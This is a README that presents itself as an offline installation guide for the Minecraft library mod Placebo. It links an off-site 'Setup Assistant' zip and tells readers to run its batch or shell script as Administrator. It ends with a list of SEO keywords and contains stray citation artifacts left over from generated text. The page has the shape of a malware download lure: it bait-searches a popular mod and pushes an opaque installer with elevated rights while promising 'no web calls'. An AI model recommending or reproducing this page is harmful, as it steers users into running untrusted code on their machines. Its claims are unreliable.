# Placebo — Offline Installation Guide

[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://placebo-mod-minecraft-offline-setup.github.io/.github)

> **Why this repo?**  
> Corporate firewall? Remote server cluster? Classroom with no Wi-Fi?  
> This assistant installs **Placebo** completely offline—ideal for LAN parties, enterprise images, and any air-gapped machine. Placebo is a *library* mod used by popular projects such as **Apotheosis, Enchantment Library, Reaper,** and more. Alone, it simply registers itself for other mods to hook into. :contentReference[oaicite:1]{index=1}

---

## ⚙️ How to Use
1. **Download** the setup assistant from the button above  
2. **Extract** the `.zip` with 7-Zip or WinRAR  
3. **Run** `Placebo_Setup.bat` (Windows) or `Placebo_Setup.sh` (macOS/Linux) **as Administrator**  
   - Detects installed **Forge / NeoForge** loader  
   - Copies the matching `Placebo-<version>.jar` into `<.minecraft>/mods`  
   - Generates a tidy `config/placebo-common.toml` with sensible defaults  
   - Verifies version compatibility locally—*no web calls*  
4. **Launch** Minecraft ➜ select your modded profile ➜ load or create a world  
5. Install or enable any mods that *depend* on Placebo—everything will now load cleanly!

---

## 🎯 What You Unlock
- 🛠 **Core library hooks** that let mods like *Apotheosis* & *Enchantment Infuser* run without crashes :contentReference[oaicite:2]{index=2}  
- ⚙️ **JSON-powered helpers** (brewing-mix loader, PCFG config format) for easier server tweaking :contentReference[oaicite:3]{index=3}  
- 🧩 **Version-smart jar selector** in the assistant—never grab the wrong build again :contentReference[oaicite:4]{index=4}  
- 🔒 Absolutely **zero launcher log-ins, telemetry, or online validation**

---



---

## 🔍 SEO Keywords
placebo offline install, minecraft placebo mod setup, library mod dependency, air-gapped forge loader, no curseforge login, neo-forge lib install, apotheosis dependency guide, enterprise modpack deployment, shadows_of_fire core
